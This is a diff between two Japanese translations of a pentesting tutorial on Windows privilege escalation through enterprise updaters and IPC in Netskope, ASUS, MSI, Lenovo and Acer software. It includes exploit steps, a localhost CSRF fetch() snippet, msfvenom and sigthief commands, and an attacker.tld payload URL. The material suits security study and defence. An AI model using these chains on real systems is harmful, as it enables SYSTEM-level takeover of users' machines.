@@ -1,28 +1,28 @@
-# Enterprise Auto-Updaters and Privileged IPC の悪用（例: Netskope, ASUS & MSI）
+# Enterprise Auto-Updaters と Privileged IPC の悪用（例：Netskope、ASUS、MSI）
 
 {{#include ../../banners/hacktricks-training.md}}
 
-このページでは、低摩擦の IPC 面と特権付きの update フローを公開する enterprise endpoint agents と updaters に見られる Windows local privilege escalation chain の一類型を一般化している。代表的な例は Windows < R129 の Netskope Client（CVE-2025-0309）で、低権限ユーザーが attacker-controlled server への enrollment を強制し、その後 SYSTEM service がインストールする malicious MSI を配信できる。
+このページでは、enterprise endpoint agent および updater で見つかった、低い障壁の IPC surface と privileged update flow を公開する Windows local privilege escalation chain の一群を一般化します。代表例は Netskope Client for Windows < R129（CVE-2025-0309）です。low-privileged user が attacker-controlled server への enrollment を強制し、その後、SYSTEM service に malicious MSI をインストールさせることができます。<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>
 
-同様の製品に対して再利用できる要点:
-- privileged service の localhost IPC を悪用して、attacker server への再 enrollment または reconfiguration を強制する。
-- vendor の update endpoints を実装し、rogue Trusted Root CA を配信して、updater を malicious な “signed” package に向ける。
-- 弱い signer checks（CN allow-lists）、任意の digest flags、緩い MSI properties を回避する。
-- IPC が “encrypted” なら、registry に保存された world-readable な machine identifiers から key/IV を導出する。
-- service が caller を image path/process name で制限する場合は、allow-listed process に inject するか、suspended で起動して最小限の thread-context patch で DLL を bootstrap する。
+類似製品に対して応用できる主なアイデア：
+- privileged service の localhost IPC を悪用し、attacker server への再 enrollment または再設定を強制する。
+- vendor の update endpoints を実装し、rogue Trusted Root CA を配布して、updater の送信先を malicious な「signed」package に変更する。
+- 弱い signer checks（CN allow-lists）、optional digest flags、緩い MSI properties を回避する。
+- IPC が「encrypted」の場合、registry に保存された world-readable な machine identifiers から key/IV を導出する。
+- service が image path/process name によって caller を制限している場合、allow-listed process に inject するか、process を suspended 状態で spawn し、最小限の thread-context patch によって DLL を bootstrap する。
 
 ---
 ## 1) localhost IPC を介して attacker server への enrollment を強制する
 
-多くの agents は、JSON を用いて localhost TCP 経由で SYSTEM service と通信する user-mode UI process を同梱している。
+多くの agent には、localhost TCP 上で JSON を使用して SYSTEM service と通信する user-mode UI process が含まれています。
 
-Netskope で観測されたもの:
-- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
+Netskope で確認された構成：
+- UI: stAgentUI（low integrity）↔ Service: stAgentSvc（SYSTEM）
 - IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN
 
-Exploit flow:
-1) backend host（例: AddonUrl）を制御する claims を持つ JWT enrollment token を作る。alg=None を使って signature が不要になるようにする。
-2) あなたの JWT と tenant name を使って provisioning command を呼び出す IPC message を送信する:
+Exploit flow：
+1) backend host（例：AddonUrl）を制御する claims を含む JWT enrollment token を作成する。署名を不要にするため、alg=None を使用する。
+2) JWT と tenant name を指定して provisioning command を呼び出す IPC message を送信する：
 ```json
 {
 "148": {
@@ -31,89 +31,89 @@ Exploit flow:
 }
 }
 ```
-3) サービスが enrollment/config のためにあなたの rogue server にアクセスし始める。例:
+3) サービスが enrollment/config のためにあなたの rogue server へアクセスし始めます。例:
 - /v1/externalhost?service=enrollment
 - /config/user/getbrandingbyemail
 
 Notes:
-- もし caller verification が path/name-based なら、許可リストにある vendor binary から request を発生させる（see §4）。
+- caller verification が path/name-based の場合は、allow-listed vendor binary からリクエストを発生させます（§4参照）。<sup>[[1]](#references)[[2]](#references)</sup>
 
 ---
-## 2) update channel を hijacking して SYSTEM として code を実行する
+## 2) update channel を hijack して SYSTEM として code を実行する
 
-client があなたの server と話し始めたら、期待される endpoints を実装し、attacker's MSI に誘導する。典型的な sequence は次のとおり:
+client があなたの server と通信したら、想定される endpoints を実装し、attacker MSI へ誘導します。一般的な sequence:
 
-1) /v2/config/org/clientconfig → 非常に短い updater interval を持つ JSON config を返す。例えば:
+1) /v2/config/org/clientconfig → 非常に短い updater interval を含む JSON config を返します。例:
 ```json
 {
 "clientUpdate": { "updateIntervalInMin": 1 },
 "check_msi_digest": false
 }
 ```
-2) /config/ca/cert → PEM CA certificate を返す。サービスはそれを Local Machine Trusted Root store にインストールする。
-3) /v2/checkupdate → malicious MSI を指す metadata と fake version を供給する。
+2) /config/ca/cert → PEM CA certificate を返す。service はこれを Local Machine Trusted Root store にインストールする。
+3) /v2/checkupdate → malicious MSI と fake version を指す metadata を提供する。
 
-現場でよく見られる common checks の bypass:
-- Signer CN allow-list: サービスは Subject CN が “netSkope Inc” または “Netskope, Inc.” と一致するかだけ確認する場合がある。あなたの rogue CA はその CN を持つ leaf を発行して MSI に署名できる。
-- CERT_DIGEST property: CERT_DIGEST という benign な MSI property を含める。install 時に enforcement はない。
-- Optional digest enforcement: config flag（例: check_msi_digest=false）が追加の cryptographic validation を無効化する。
+実環境でよく見られるチェックの bypass:
+- Signer CN allow-list: service は Subject CN が “netSkope Inc” または “Netskope, Inc.” と一致するかだけをチェックする場合がある。rogue CA でその CN を持つ leaf を発行し、MSI に署名できる。
+- CERT_DIGEST property: CERT_DIGEST という名前の benign な MSI property を含める。install 時には enforcement がない。
+- Optional digest enforcement: config flag（例: check_msi_digest=false）で追加の cryptographic validation を無効化できる。
 
-Result: SYSTEM service は
+結果: SYSTEM service が
 C:\ProgramData\Netskope\stAgent\data\*.msi
-からあなたの MSI を install し、arbitrary code を NT AUTHORITY\SYSTEM として実行する。
+から MSI をインストールし、NT AUTHORITY\SYSTEM として arbitrary code を実行する。<sup>[[1]](#references)[[2]](#references)</sup>
 
-Patch-bypass の教訓: ベンダーが update source を cryptographically authenticate せず、代わりに “trusted” domains の小さな allow-list だけを設定した場合、traffic を still steer できる vendor-owned redirectors や reverse proxies を探すこと。Netskope の case では、後続の public research により、R129-era の allow-list が `rproxy.goskope.com` 経由でまだ abuse 可能で、そこは attacker-controlled Azure App Service content を proxy していたことが示された。hostname allow-lists は trust boundary ではなく、speed bump と考えるべき。
+Patch-bypass lesson: vendor が update source を cryptographically authenticating する代わりに、少数の “trusted” domains を allow-listing して対応した場合でも、traffic を誘導できる vendor-owned redirectors や reverse proxies を探す。Netskope の場合、公開された follow-up research により、R129-era allow-list が `rproxy.goskope.com` 経由で引き続き abuse 可能であり、この proxy が attacker-controlled Azure App Service content を中継していたことが示された。hostname allow-list は trust boundary ではなく、speed bump として扱うべきである。<sup>[[14]](#references)</sup>
 
 ---
-## 3) encrypted IPC requests を forge する (when present)
+## 3) Forging encrypted IPC requests (when present)
 
-R127 から、Netskope は IPC JSON を Base64 のように見える encryptData field で wrap していた。reverse すると、key/IV は any user が読める registry values から導出される AES だった:
+R127 以降、Netskope は IPC JSON を Base64 に見える encryptData field で wrap した。Reversing により、AES の key/IV が any user から readable な registry values から derived されていることが判明した:
 - Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
 - IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID
 
-Attackers は encryption を再現し、standard user から valid な encrypted commands を送信できる。general tip: agent が突然 IPC を “encrypt” し始めたら、material として HKLM 配下の device IDs, product GUIDs, install IDs を探すこと。
+Attackers は encryption を再現し、standard user から valid encrypted commands を送信できる。<sup>[[1]](#references)[[2]](#references)</sup> General tip: agent が突然 IPC を “encrypt” し始めた場合、HKLM 配下にある device IDs、product GUIDs、install IDs を material として探す。
 
 ---
-## 4) IPC caller allow-lists の bypass (path/name checks)
+## 4) Bypassing IPC caller allow-lists (path/name checks)
 
-一部の services は、TCP connection の PID を解決し、image path/name を allow-listed vendor binaries（例: stagentui.exe, bwansvc.exe, epdlp.exe）と比較して peer を authenticate しようとする。
+一部の services は、TCP connection の PID を resolve し、image path/name を Program Files 配下にある allow-listed vendor binaries（例: stagentui.exe、bwansvc.exe、epdlp.exe）と比較することで peer を authenticate しようとする。
 
-実用的な bypass は 2 つ:
-- allow-listed process（例: nsdiag.exe）への DLL injection を行い、その中から IPC を proxy する。
-- CreateRemoteThread を使わずに allow-listed binary を suspended で spawn し、proxy DLL を bootstrap して driver-enforced tamper rules を満たす（§5 を参照）。
+実用的な bypass は 2 つある:
+- allow-listed process（例: nsdiag.exe）に DLL injection し、その内部から IPC を proxy する。
+- allow-listed binary を suspended 状態で spawn し、CreateRemoteThread を使わずに proxy DLL を bootstrap する（§5 参照）。これにより driver-enforced tamper rules を満たす。<sup>[[1]](#references)[[2]](#references)</sup>
 
 ---
 ## 5) Tamper-protection friendly injection: suspended process + NtContinue patch
 
-Products は protected processes への handles から dangerous rights を strip するために、minifilter/OB callbacks driver（例: Stadrv）を同梱することが多い:
-- Process: PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME を削除
-- Thread: THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE に制限
+Products は、protected processes への handles から dangerous rights を strip する minifilter/OB callbacks driver（例: Stadrv）を搭載することが多い:
+- Process: PROCESS_TERMINATE、PROCESS_CREATE_THREAD、PROCESS_VM_READ、PROCESS_DUP_HANDLE、PROCESS_SUSPEND_RESUME を削除する
+- Thread: THREAD_GET_CONTEXT、THREAD_QUERY_LIMITED_INFORMATION、THREAD_RESUME、SYNCHRONIZE のみに制限する
 
-これらの制約を尊重する reliable な user-mode loader:
-1) vendor binary を CREATE_SUSPENDED 付きで CreateProcess する。
-2) まだ許可されている handle を取得する: process には PROCESS_VM_WRITE | PROCESS_VM_OPERATION、thread handle には THREAD_GET_CONTEXT/THREAD_SET_CONTEXT（または、既知の RIP に code patch するなら THREAD_RESUME だけでもよい）。
-3) ntdll!NtContinue（または、早期に必ず mapped される他の thunk）を、あなたの DLL path に対して LoadLibraryW を呼び出し、その後元に戻る tiny stub で上書きする。
-4) ResumeThread して in-process で stub を実行させ、DLL を load する。
+これらの constraints を尊重する reliable な user-mode loader:
+1) CREATE_SUSPENDED を指定して vendor binary を CreateProcess する。
+2) まだ許可されている handles を取得する: process には PROCESS_VM_WRITE | PROCESS_VM_OPERATION、thread には THREAD_GET_CONTEXT/THREAD_SET_CONTEXT（または既知の RIP で code を patch する場合は THREAD_RESUME のみ）。
+3) ntdll!NtContinue（または early かつ guaranteed-mapped な別の thunk）を、DLL path に対して LoadLibraryW を呼び出し、その後 back に jump する tiny stub で overwrite する。
+4) ResumeThread して in-process で stub を trigger し、DLL を load する。
 
-protected process に対して PROCESS_CREATE_THREAD や PROCESS_SUSPEND_RESUME を使っていない（自分で作成した）ため、driver の policy は満たされる。
+すでに protected な process に対して PROCESS_CREATE_THREAD や PROCESS_SUSPEND_RESUME を使用せず、process 自体を作成したため、driver の policy を満たす。<sup>[[1]](#references)[[2]](#references)</sup>
 
 ---
 ## 6) Practical tooling
-- NachoVPN (Netskope plugin) は rogue CA、malicious MSI signing、必要な endpoints の提供を自動化する: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate。
-- UpSkope は custom IPC client で、任意の（optionally AES-encrypted）IPC messages を生成し、allow-listed binary から起動したように見せる suspended-process injection を含む。
+- NachoVPN (Netskope plugin) は rogue CA、malicious MSI signing、および必要な endpoints（/v2/config/org/clientconfig、/config/ca/cert、/v2/checkupdate）の serving を automate する。<sup>[[3]](#references)</sup>
+- UpSkope は arbitrary な（optionally AES-encrypted）IPC messages を craft する custom IPC client であり、allow-listed binary から originate するための suspended-process injection も含む。<sup>[[4]](#references)</sup>
 
 ## 7) Fast triage workflow for unknown updater/IPC surfaces
 
-新しい endpoint agent や motherboard “helper” suite に直面したとき、次の quick workflow で privesc target として有望かどうかをすぐに判断できる:
+新しい endpoint agent や motherboard の “helper” suite に対処する場合、promising な privesc target を見ているかどうかを判断するには、通常 quick workflow で十分である:<sup>[[6]](#references)</sup>
 
-1) loopback listeners を列挙し、vendor processes に対応付ける:
+1) loopback listeners を enumerate し、vendor processes に map する:
 ```powershell
 Get-NetTCPConnection -State Listen |
 Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
 Select-Object LocalAddress,LocalPort,OwningProcess,
 @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
 ```
-2) 候補の named pipes を列挙する:
+2) 候補となる名前付きパイプを列挙:
 ```powershell
 [System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
 ```
@@ -122,37 +122,38 @@ Select-Object LocalAddress,LocalPort,OwningProcess,
 Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
 Select-Object PSChildName
 ```
-4) まず user-mode client から endpoint 名、JSON key、command ID を抽出する。packed Electron/.NET frontends は頻繁に完全な schema を漏えいさせる:
+4) まず user-mode client から endpoint 名、JSON key、command ID を抽出します。Packed Electron/.NET frontend は、完全な schema を頻繁に leak します：
 ```powershell
 Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
 -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
 ```
-5) 実際の trust predicate を探せ、最終的にプロセスを起動する code path だけではなく:
+5) 最終的にプロセスを起動するコードパスだけでなく、実際のtrust predicateを探す：
 ```powershell
 Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
 -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
 ```
-優先して探すべきパターン:
-- `CryptQueryObject`/certificate parsing に `WinVerifyTrust` がない場合、通常は「certificate が存在する」ことを「certificate が trusted である」こととして扱っており、certificate cloning やその他の fake-signer trick を可能にします。
-- `Origin`, `Referer`, download URLs, process names, signer CN に対する substring/suffix チェックは authentication ではありません。`contains(".vendor.com")` は、攻撃者が制御する lookalike domains で通常 exploitable です。
-- 低権限の GUI が「the file is trusted」と判断し、SYSTEM broker がその結果をそのまま消費するだけなら、client-side DLL/JS を patch もしくは reimplement するだけで boundary を完全に bypass できることがよくあります（Razer-style split validation）。
-- broker が payload を `%TEMP%`/`C:\Windows\Temp` にコピーし、その後その path から validate したり schedule したりするなら、直ちに TOCTOU replacement windows と、より弱い checks を持つ alternate `ExecuteTask()` wrappers を公開する sibling plugin modules を test してください。
+優先して調査する価値のあるパターン:
 
-named-pipe が多い target では、PipeViewer は protocol を深く reverse する前に weak DACLs と remotely reachable pipes を素早く見つけるのに役立ちます。
+- `CryptQueryObject`/certificate parsing が `WinVerifyTrust` なしで行われている場合、通常は「certificate が存在する」ことを「certificate は trusted である」として扱っていることを意味し、certificate cloning やその他の fake-signer tricks が可能になります。
+- `Origin`、`Referer`、download URLs、process names、signer CNs に対する substring/suffix checks は authentication ではありません。`contains(".vendor.com")` は、攻撃者が制御する lookalike domains によって通常は exploit 可能です。
+- low-privileged GUI が「file は trusted」と判断し、SYSTEM broker がその結果を単に利用している場合、client-side DLL/JS を patch または reimplement するだけで boundary 全体を bypass できることがあります（Razer-style split validation）。
+- broker が payload を `%TEMP%`/`C:\Windows\Temp` にコピーし、その path から validate または schedule する場合は、直ちに TOCTOU replacement windows と、より弱い checks を公開する sibling plugin modules の `ExecuteTask()` wrappers をテストしてください。<sup>[[6]](#references)</sup>
 
-target が caller を PID, image path, process name だけで authenticate しているなら、それは boundary ではなく speed bump とみなしてください。legitimate client に inject するか、allow-listed process から connection を作るだけで server の checks を満たせることが多いです。named pipes に関しては、[client impersonation and pipe abuse についてのこのページ](named-pipe-client-impersonation.md) が primitive をより詳しく説明しています。
+named-pipe-heavy targets では、protocol を詳しく reversing し始める前に、PipeViewer を使うと weak DACLs と remotely reachable pipes を素早く確認できます。<sup>[[11]](#references)</sup>
+
+target が callers を PID、image path、または process name だけで authenticate している場合、それを boundary ではなく speed bump と考えてください。legitimate client への injecting、または allow-listed process から connection を作成するだけで、server の checks を満たせることがよくあります。named pipes については、[client impersonation と pipe abuse に関するこのページ](named-pipe-client-impersonation.md)で、この primitive をさらに詳しく説明しています。
 
 ---
-## 8) vendor signatures のみで authenticated される modular add-in brokers (Lenovo Vantage pattern)
+## 8) vendor signatures のみで authenticated された modular add-in brokers（Lenovo Vantage pattern）
 
-探す価値のある新しい variation は **signed-client RPC broker** です。低権限の Lenovo-signed desktop process が SYSTEM service と通信し、service は JSON commands を `%ProgramData%` 配下の XML で記述された add-ins に route します。いったん **accepted signed client の内部で** code execution を達成できれば、`runas="system"` の contract はすべて attack surface の一部になります。
+調査する価値のある新しい variation として、**signed-client RPC broker** があります。これは、low-privileged な Lenovo-signed desktop process が SYSTEM service と通信し、その service が `%ProgramData%` 配下の XML-described add-ins に JSON commands をルーティングする構成です。**accepted signed client 内部**で code execution を達成すると、すべての `runas="system"` contracts が attack surface の一部になります。<sup>[[15]](#references)</sup>
 
-Lenovo Vantage の research で観測された高価値 primitive:
-- **vendor に signed されているという理由で caller を信頼する**: researchers は、書き込み可能な directory に Lenovo-signed EXE をコピーし、DLL side-load (`profapi.dll`) を満たすことで authenticated context に到達し、service がすでに trust している client 内で arbitrary code を実行しました。
-- **manifest-driven attack surface discovery**: add-ins は `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` の下で宣言されます。複数の contract は `SYSTEM` として実行されるため、これらの manifest を列挙すると、broker 自体を reverse するよりも速く本当の privileged verbs が見つかることがよくあります。
-- **authenticated channel の背後にある per-command bugs**: trusted client の内部に入ると、public research では update/install verbs の path-traversal + race conditions、privileged settings databases に対する raw-SQL abuse、そして意図した hive の外への書き込みを可能にする substring ベースの registry path checks が見つかりました。
+Lenovo Vantage research で確認された high-value primitives:
+- **vendor によって signed されていることを理由に caller を trust する**: researchers は、Lenovo-signed EXE を writable directory にコピーし、DLL side-load (`profapi.dll`) を成立させることで authenticated context に到達しました。これにより、service がすでに trusted している client 内部で arbitrary code が実行されました。
+- **manifest-driven attack surface discovery**: add-ins は `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` 配下で宣言されています。複数の contracts が `SYSTEM` として実行されるため、それらの manifests を列挙することで、broker 自体を reversing するよりも早く、実際の privileged verbs を発見できることがよくあります。
+- **authenticated channel の背後にある per-command bugs**: trusted client 内部に入ると、public research により、update/install verbs における path-traversal + race conditions、privileged settings databases に対する raw-SQL abuse、意図された hive 外への writes を可能にする substring-based registry path checks が発見されています。
 
-target 上で有用な recon:
+target で有用な recon:
 ```powershell
 Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
 Select-String -Pattern 'runas="system"|<name>|<namespace>'
@@ -162,17 +163,17 @@ Select-String -Pattern 'runas="system"|<name>|<namespace>'
 Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
 -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
 ```
-Practical takeaway: helper suite が broker を公開していて、まず **caller process** を認証し、その後に数十の plugin/add-in command を dispatch する場合、フロントドアの trust check を bypass しただけで止まってはいけない。manifest/contract table を dump して、各 high-privilege verb を独立して fuzz せよ。authenticated channel には、たいてい複数の second-stage bug が隠れている。
+実践的な要点: helper suite が、まず **caller process** を認証し、その後に数十個の plugin/add-in コマンドへ dispatch する broker を公開している場合、front-door の trust check を bypass しただけで止めてはいけない。manifest/contract table をダンプし、各 high-privilege verb を個別に fuzz すること。認証済み channel の内部には、通常、複数の second-stage bug が隠れている。
 
 ---
-## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)
+## 1) 特権 HTTP API（ASUS DriverHub）に対する Browser-to-localhost CSRF
 
-DriverHub は user-mode の HTTP service (ADU.exe) を 127.0.0.1:53000 で提供しており、https://driverhub.asus.com から来る browser call を想定している。origin filter は単純に Origin header と `/asus/v1.0/*` で公開される download URL に対して `string_contains(".asus.com")` を実行するだけである。したがって、`https://driverhub.asus.com.attacker.tld` のような attacker-controlled host はこの check を通過し、JavaScript から state-changing request を送信できる。追加の bypass pattern については [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) を参照。
+DriverHub は、127.0.0.1:53000 上で user-mode HTTP service（ADU.exe）を提供しており、https://driverhub.asus.com から送信された browser call を想定している。origin filter は、Origin header と `/asus/v1.0/*` が公開する download URL に対して、単純に `string_contains(".asus.com")` を実行する。そのため、`https://driverhub.asus.com.attacker.tld` のような attacker-controlled host は check を通過し、JavaScript から state-changing request を発行できる。<sup>[[6]](#references)</sup> 追加の bypass pattern については [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) を参照。
 
-Practical flow:
-1) `.asus.com` を埋め込んだ domain を register し、そこに malicious webpage を host する。
-2) `fetch` または XHR を使って、`http://127.0.0.1:53000` 上の privileged endpoint (例: `Reboot`, `UpdateApp`) を呼び出す。
-3) handler が期待する JSON body を送信する – packed frontend JS が以下の schema を示している。
+実践的な flow:
+1) `.asus.com` を含む domain を登録し、そこに malicious webpage を host する。
+2) `fetch` または XHR を使用して、`http://127.0.0.1:53000` 上の privileged endpoint（例: `Reboot`、`UpdateApp`）を呼び出す。
+3) handler が想定する JSON body を送信する。packed frontend JS に以下の schema が示されている。
 ```javascript
 fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
 method: "POST",
@@ -180,89 +181,88 @@ headers: { "Content-Type": "application/json" },
 body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
 });
 ```
-以下に示す PowerShell CLI でも、Origin ヘッダーを信頼された値に偽装すると成功します:
+以下に示す PowerShell CLI でも、Origin header を信頼された値に spoof すると成功します。
 ```powershell
 Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
 -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
 -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
 ```
-Any browser visit to the attacker site therefore becomes a 1-click (or 0-click via `onload`) local CSRF that drives a SYSTEM helper.
+攻撃者のサイトをブラウザーで訪問するだけで、SYSTEM helper を動かす 1-click（または `onload` による 0-click）の local CSRF になります。
 
 ---
 ## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)
 
-`/asus/v1.0/UpdateApp` は、JSON body で定義された任意の executables をダウンロードし、`C:\ProgramData\ASUS\AsusDriverHub\SupportTemp` にキャッシュする。Download URL の validation も同じ substring logic を再利用しているため、`http://updates.asus.com.attacker.tld:8000/payload.exe` が受け入れられる。ダウンロード後、ADU.exe は PE に signature が含まれていることと、実行前に Subject string が ASUS と一致することだけを確認する。`WinVerifyTrust` も chain validation もない。
+`/asus/v1.0/UpdateApp` は、JSON body で指定された任意の executable をダウンロードし、`C:\ProgramData\ASUS\AsusDriverHub\SupportTemp` に cache します。Download URL の validation では同じ substring logic が再利用されているため、`http://updates.asus.com.attacker.tld:8000/payload.exe` も受け入れられます。ダウンロード後、ADU.exe は PE に signature が含まれていることと、Subject string が ASUS と一致することだけを確認してから実行します。`WinVerifyTrust` も chain validation もありません。
 
-この flow を weaponize するには:
-1) payload を作成する（例: `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`）。
-2) ASUS の signer をそれに clone する（例: `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`）。
-3) `pwn.exe` を `.asus.com` の lookalike domain で host し、上の browser CSRF で UpdateApp を trigger する。
+この flow を weaponize するには、次の手順を実行します。
+1) payload を作成します（例: `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`）。
+2) ASUS の signer を payload に clone します（例: `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`）。
+3) `pwn.exe` を `.asus.com` の lookalike domain で host し、上記の browser CSRF を介して UpdateApp を trigger します。
 
-Origin と URL の両方の filters が substring-based であり、signer check も string comparison しか行わないため、DriverHub は attacker binary を elevated context で pull して execute する。
+Origin と URL の両方の filter が substring-based であり、signer check も string の比較しか行わないため、DriverHub は attacker binary を取得し、elevated context で実行します。<sup>[[6]](#references)</sup>
 
 ---
 ## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)
 
-MSI Center の SYSTEM service は、各 frame が `4-byte ComponentID || 8-byte CommandID || ASCII arguments` である TCP protocol を expose している。core component (Component ID `0f 27 00 00`) は `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}` を ship する。handler は:
-1) supplied executable を `C:\Windows\Temp\MSI Center SDK.exe` に copy する。
-2) `CS_CommonAPI.EX_CA::Verify` を通じて signature を verify する（certificate subject は “MICRO-STAR INTERNATIONAL, CO., LTD.” と一致し、`WinVerifyTrust` が成功しなければならない）。
-3) attacker-controlled arguments 付きで temp file を SYSTEM として実行する scheduled task を create する。
+MSI Center の SYSTEM service は、各 frame が `4-byte ComponentID || 8-byte CommandID || ASCII arguments` で構成される TCP protocol を公開しています。core component（Component ID `0f 27 00 00`）には `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}` が搭載されています。その handler は次の処理を行います。
+1) 指定された executable を `C:\Windows\Temp\MSI Center SDK.exe` に copy します。
+2) `CS_CommonAPI.EX_CA::Verify` を介して signature を検証します（certificate subject は “MICRO-STAR INTERNATIONAL CO., LTD.” と一致し、`WinVerifyTrust` が成功する必要があります）。
+3) temp file を attacker-controlled arguments とともに SYSTEM として実行する scheduled task を作成します。
 
-コピーされた file は verification と `ExecuteTask()` の間で lock されていない。attacker は:
-- Frame A を、正規の MSI-signed binary を指すように送る（signature check が pass し、task が queue されることを保証）。
-- それと race させて、malicious payload を指す repeated Frame B messages を送り、verification 完了直後に `MSI Center SDK.exe` を上書きする。
+copy された file は、検証から `ExecuteTask()` までの間、lock されません。攻撃者は次の操作を実行できます。
+- 正規の MSI-signed binary を指す Frame A を送信します（signature check が通過し、task が queue に入ることを保証します）。
+- 検証完了直後に `MSI Center SDK.exe` を上書きする malicious payload を指す Frame B message を繰り返し送信し、race させます。
 
-scheduler が fire すると、元の file を validate したにもかかわらず、上書きされた payload を SYSTEM で execute する。reliable exploitation には、`CMD_AutoUpdateSDK` を spam する 2 つの goroutines/threads を使い、TOCTOU window を勝つ。
+scheduler が起動すると、元の file を検証済みであるにもかかわらず、上書きされた payload が SYSTEM として実行されます。確実な exploitation には、TOCTOU window を奪取するまで CMD_AutoUpdateSDK を spam する 2 つの goroutine/thread を使用します。<sup>[[6]](#references)</sup>
 
 ---
 ## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)
 
 ### MSI Center TCP command sets
-- `MSI.CentralServer.exe` に loaded されるすべての plugin/DLL は、`HKLM\SOFTWARE\MSI\MSI_CentralServer` の下に保存された Component ID を受け取る。frame の最初の 4 bytes がその component を select し、attacker が commands を arbitrary modules に route できる。
-- Plugins は独自の task runners を定義できる。`Support\API_Support.dll` は `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` を expose し、`API_Support.EX_Task::ExecuteTask()` を **signature validation なし** で直接 call する。any local user can point it at `C:\Users\<user>\Desktop\payload.exe` and get SYSTEM execution deterministically.
-- Wireshark で loopback を sniff するか、dnSpy で .NET binaries を instrument すると、Component ↔ command mapping が quickly reveal される。その後 custom Go/ Python clients で frames を replay できる。
+- `MSI.CentralServer.exe` が load するすべての plugin/DLL には、`HKLM\SOFTWARE\MSI\MSI_CentralServer` に保存された Component ID が割り当てられます。frame の最初の 4 bytes がその component を選択するため、攻撃者は任意の module に command を route できます。
+- plugin は独自の task runner を定義できます。`Support\API_Support.dll` は `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` を公開し、signature validation なしで `API_Support.EX_Task::ExecuteTask()` を直接 call します。これにより、任意の local user が `C:\Users\<user>\Desktop\payload.exe` を指定し、確実に SYSTEM execution を得られます。
+- Wireshark で loopback を sniff するか、dnSpy で .NET binaries に instrument を施すと、Component と command の mapping をすぐに確認できます。その後、custom Go/ Python clients で frame を replay できます。<sup>[[6]](#references)</sup>
 
 ### Acer Control Centre named pipes & impersonation levels
-- `ACCSvc.exe` (SYSTEM) は `\\.\pipe\treadstone_service_LightMode` を expose し、その discretionary ACL は remote clients を許可する（例: `\\TARGET\pipe\treadstone_service_LightMode`）。command ID `7` に file path を送ると、service の process-spawning routine が invoke される。
-- client library は args と一緒に magic terminator byte (113) を serialize する。Frida/`TsDotNetLib` による dynamic instrumentation（instrumentation tips については [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) を参照）では、native handler が `CreateProcessAsUser` を call する前に、この value を `SECURITY_IMPERSONATION_LEVEL` と integrity SID に map していることが示される。
-- 113 (`0x71`) を 114 (`0x72`) に swap すると、generic branch に入り、full SYSTEM token を保持しつつ high-integrity SID (`S-1-16-12288`) を set する。spawn された binary は local でも cross-machine でも unrestricted SYSTEM として実行される。
-- それに exposed installer flag (`Setup.exe -nocheck`) を組み合わせれば、vendor hardware がなくても lab VM 上で ACC を立ち上げ、pipe を exercise できる。
+- `ACCSvc.exe`（SYSTEM）は `\\.\pipe\treadstone_service_LightMode` を公開しており、その discretionary ACL は remote clients（例: `\\TARGET\pipe\treadstone_service_LightMode`）を許可しています。command ID `7` と file path を送信すると、service の process-spawning routine が呼び出されます。
+- client library は、args とともに magic terminator byte（113）を serialize します。Frida/`TsDotNetLib` による dynamic instrumentation（instrumentation の tips は [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) を参照）により、native handler がこの値を `SECURITY_IMPERSONATION_LEVEL` と integrity SID に mapping してから `CreateProcessAsUser` を call していることが分かります。
